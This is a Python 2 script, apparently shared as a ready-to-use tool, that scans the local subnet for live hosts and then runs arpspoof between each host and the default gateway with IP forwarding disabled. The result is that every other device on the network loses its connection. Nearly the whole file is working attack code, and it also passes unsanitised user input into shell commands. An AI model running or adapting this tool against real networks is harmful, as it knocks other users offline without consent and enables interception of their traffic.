# conding: utf-8

# Codded by: @i127001
# Twitter: https://twitter.com/i127001
# Requirements library: command, multiprocessing
# Requirements packages: dsniff


import commands as cm
import multiprocessing as mp
import socket
import os


ips_file_path = '~/.killall_ips.txt'


class Scan():

    def __init__(self):
        try:
            self.ips_file_path = ips_file_path
            f = open(ips_file_path, 'w')
            f.write('')
            f.close()
            print('\n')
            print('# Codded by: @i127001')
            print('# Twitter: https://twitter.com/i127001')
            new_file = cm.getstatusoutput('echo "" > /root/Kj_test_YB34gnjcdvkndhb_temp_.txt')
            if('denied' in new_file[1].lower()):
                print("\nYou must be a sudo or su\n")
                print("\n\nExited \n-------\n")
                exit()
            else:
                os.system('sudo rm /root/Kj_test_YB34gnjcdvkndhb_temp_.txt')
                check_arp = cm.getstatusoutput('sudo arpspoof -h')
                if('command not found' in check_arp[1].lower()):
                    uo = raw_input('arpspoof command not found, Download it? [Y/n]: ')
                    if(uo.lower() == 'y'):
                        my_sys = raw_input('Your system based on ? [1 for arch], [2 for debian]: ')
                        if(my_sys.lower() == '1'):
                            download_command = 'sudo pacman -S dsniff'
                        elif(my_sys.lower() == '2'):
                            download_command = 'sudo apt-get install dsniff'
                        else:
                            print("You need to insert 1 or 2")
                            print("\n\nExited \n-------\n")
                            exit()
                        os.system(download_command)
                    else:
                        print("\n\nExited \n-------\n")
                        exit()
                self.default_ip = raw_input('\n-------\n\nInsert [default getway IP]: ')
                check_resp = cm.getstatusoutput('ping ' + self.default_ip + ' -c 1')
                if(check_resp[0] == 512):
                    print("\n\nIP: '" + self.default_ip + "' Not response!\n")
                    exit()
                print('\n-------\nTo exit from this session press Ctrl-c\n-------\n')
                self.my_ip = socket.gethostbyname(socket.gethostname())
                self.ip_with_out_last_number = self.default_ip[:self.default_ip.find('.', 8) + 1]
                self.my_ip_end = self.my_ip[self.default_ip.find('.', 8) + 1:]
                self.end_default = self.default_ip[self.default_ip.find('.', 8) + 1:]
        except Exception:
            cm.getstatusoutput('sudo killall arpspoof ')
            exit()

    def scan_ips(self, from_num, to_num):
        try:
            for i in range(from_num, to_num):
                if(i != int(self.my_ip_end) and i != int(self.end_default)):
                    real_ip = self.ip_with_out_last_number + str(i)
                    arp_scan = cm.getstatusoutput('ping ' + real_ip + ' -c 1')
                    if(arp_scan[0] == 0):
                        print("Found: " + real_ip)
                        f = open(self.ips_file_path, 'a')
                        f.write(real_ip + '\n')
                        f.close()
                    if(real_ip == self.ip_with_out_last_number + '255'):
                        f = open(self.ips_file_path, 'r')
                        ips = str(f.read()).split('\n')
                        f.close()
                        ips.remove('')
                        ip_forward_off = cm.getstatusoutput('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')
                        if('denied' in ip_forward_off[1].lower()):
                            print("\nYou must be a sudo or su\n")
                            print("\n\nExited \n-------\n")
                            exit()
                        else:
                            print("\nForwarding IPv4 turned OFF\n")
                            print('\n-------\nTo exit from this session press Ctrl-c\n-------\n')
                            print("\nPlease wait ...")
                            for ip_to_kill in ips:
                                try:
                                    mp.Process(target=self.kill_all, args=([ip_to_kill])).start()
                                except Exception:
                                    cm.getstatusoutput('sudo killall arpspoof')
                                    exit()
        except Exception:
            cm.getstatusoutput('sudo killall arpspoof ')
            pass
            exit()

    def kill_all(self, ip):
        try:
            print('Killing ' + ip)
            os.system('sudo arpspoof -t ' + ip + " " + self.default_ip + " &")
            os.system('sudo arpspoof -t ' + self.default_ip + " " + ip + " &")
        except Exception:
            cm.getstatusoutput('sudo killall arpspoof ')
            exit()


scan = Scan()
print("Scanning...")
def from_1_to_5():
    scan.scan_ips(1, 5)

def from_5_to_10():
    scan.scan_ips(5, 10)

def from_10_to_15():
    scan.scan_ips(10, 15)

def from_15_to_20():
    scan.scan_ips(15, 20)

def from_20_to_25():
    scan.scan_ips(20, 25)

def from_25_to_30():
    scan.scan_ips(25, 30)

def from_30_to_35():
    scan.scan_ips(30, 35)

def from_35_to_40():
    scan.scan_ips(35, 40)

def from_40_to_45():
    scan.scan_ips(40, 45)

def from_45_to_50():
    scan.scan_ips(45, 50)

def from_50_to_55():
    scan.scan_ips(50, 55)

def from_55_to_60():
    scan.scan_ips(55, 60)

def from_60_to_65():
    scan.scan_ips(60, 65)

def from_65_to_70():
    scan.scan_ips(65, 70)

def from_70_to_75():
    scan.scan_ips(70, 75)

def from_75_to_80():
    scan.scan_ips(75, 80)

def from_80_to_85():
    scan.scan_ips(80, 85)

def from_85_to_90():
    scan.scan_ips(85, 90)

def from_90_to_95():
    scan.scan_ips(90, 95)

def from_95_to_100():
    scan.scan_ips(95, 100)

def from_100_to_105():
    scan.scan_ips(100, 105)

def from_105_to_110():
    scan.scan_ips(105, 110)

def from_110_to_115():
    scan.scan_ips(110, 115)

def from_115_to_120():
    scan.scan_ips(115, 120)

def from_120_to_125():
    scan.scan_ips(120, 125)

def from_125_to_130():
    scan.scan_ips(125, 130)

def from_130_to_135():
    scan.scan_ips(130, 135)

def from_135_to_140():
    scan.scan_ips(135, 140)

def from_140_to_145():
    scan.scan_ips(140, 145)

def from_145_to_150():
    scan.scan_ips(145, 150)

def from_150_to_155():
    scan.scan_ips(150, 155)

def from_155_to_160():
    scan.scan_ips(155, 160)

def from_160_to_165():
    scan.scan_ips(160, 165)

def from_165_to_170():
    scan.scan_ips(165, 170)

def from_170_to_175():
    scan.scan_ips(170, 175)

def from_175_to_180():
    scan.scan_ips(175, 180)

def from_180_to_185():
    scan.scan_ips(180, 185)

def from_185_to_190():
    scan.scan_ips(185, 190)

def from_190_to_195():
    scan.scan_ips(190, 195)

def from_195_to_200():
    scan.scan_ips(195, 200)

def from_200_to_205():
    scan.scan_ips(200, 205)

def from_205_to_210():
    scan.scan_ips(205, 210)

def from_210_to_215():
    scan.scan_ips(210, 215)

def from_215_to_220():
    scan.scan_ips(215, 220)

def from_220_to_225():
    scan.scan_ips(220, 225)

def from_225_to_230():
    scan.scan_ips(225, 230)

def from_230_to_235():
    scan.scan_ips(230, 235)

def from_235_to_240():
    scan.scan_ips(235, 240)

def from_240_to_245():
    scan.scan_ips(240, 245)

def from_245_to_250():
    scan.scan_ips(245, 250)

def from_250_to_255():
    scan.scan_ips(250, 256)

try:
    p1 = mp.Process(target=from_1_to_5, args=())
    p1.start()

    p2 = mp.Process(target=from_5_to_10, args=())
    p2.start()

    p3 = mp.Process(target=from_10_to_15, args=())
    p3.start()

    p4 = mp.Process(target=from_15_to_20, args=())
    p4.start()

    p5 = mp.Process(target=from_20_to_25, args=())
    p5.start()

    p6 = mp.Process(target=from_25_to_30, args=())
    p6.start()

    p7 = mp.Process(target=from_30_to_35, args=())
    p7.start()

    p8 = mp.Process(target=from_35_to_40, args=())
    p8.start()

    p9 = mp.Process(target=from_40_to_45, args=())
    p9.start()

    p10 = mp.Process(target=from_40_to_45, args=())
    p10.start()

    p11 = mp.Process(target=from_45_to_50, args=())
    p11.start()

    p12 = mp.Process(target=from_50_to_55, args=())
    p12.start()

    p13 = mp.Process(target=from_55_to_60, args=())
    p13.start()

    p14 = mp.Process(target=from_60_to_65, args=())
    p14.start()

    p15 = mp.Process(target=from_65_to_70, args=())
    p15.start()

    p16 = mp.Process(target=from_70_to_75, args=())
    p16.start()

    p17 = mp.Process(target=from_75_to_80, args=())
    p17.start()

    p18 = mp.Process(target=from_80_to_85, args=())
    p18.start()

    p19 = mp.Process(target=from_85_to_90, args=())
    p19.start()

    p20 = mp.Process(target=from_90_to_95, args=())
    p20.start()

    p21 = mp.Process(target=from_95_to_100, args=())
    p21.start()

    p22 = mp.Process(target=from_100_to_105, args=())
    p22.start()

    p23 = mp.Process(target=from_105_to_110, args=())
    p23.start()

    p24 = mp.Process(target=from_110_to_115, args=())
    p24.start()

    p25 = mp.Process(target=from_115_to_120, args=())
    p25.start()

    p26 = mp.Process(target=from_120_to_125, args=())
    p26.start()

    p27 = mp.Process(target=from_125_to_130, args=())
    p27.start()

    p28 = mp.Process(target=from_130_to_135, args=())
    p28.start()

    p29 = mp.Process(target=from_135_to_140, args=())
    p29.start()

    p30 = mp.Process(target=from_140_to_145, args=())
    p30.start()

    p31 = mp.Process(target=from_145_to_150, args=())
    p31.start()

    p32 = mp.Process(target=from_150_to_155, args=())
    p32.start()

    p33 = mp.Process(target=from_155_to_160, args=())
    p33.start()

    p34 = mp.Process(target=from_160_to_165, args=())
    p34.start()

    p35 = mp.Process(target=from_165_to_170, args=())
    p35.start()

    p36 = mp.Process(target=from_170_to_175, args=())
    p36.start()

    p37 = mp.Process(target=from_175_to_180, args=())
    p37.start()

    p38 = mp.Process(target=from_180_to_185, args=())
    p38.start()

    p39 = mp.Process(target=from_185_to_190, args=())
    p39.start()

    p40 = mp.Process(target=from_190_to_195, args=())
    p40.start()

    p41 = mp.Process(target=from_195_to_200, args=())
    p41.start()

    p42 = mp.Process(target=from_200_to_205, args=())
    p42.start()

    p43 = mp.Process(target=from_205_to_210, args=())
    p43.start()

    p44 = mp.Process(target=from_210_to_215, args=())
    p44.start()

    p45 = mp.Process(target=from_215_to_220, args=())
    p45.start()

    p46 = mp.Process(target=from_220_to_225, args=())
    p46.start()

    p47 = mp.Process(target=from_225_to_230, args=())
    p47.start()

    p48 = mp.Process(target=from_230_to_235, args=())
    p48.start()

    p49 = mp.Process(target=from_235_to_240, args=())
    p49.start()

    p50 = mp.Process(target=from_240_to_245, args=())
    p50.start()

    p51 = mp.Process(target=from_245_to_250, args=())
    p51.start()

    p52 = mp.Process(target=from_250_to_255, args=())
    p52.start()

    op = raw_input()
except Exception:
    cm.getstatusoutput('sudo killall arpspoof ')
    exit()
except KeyboardInterrupt:
    cm.getstatusoutput('sudo killall arpspoof ')
    exit()
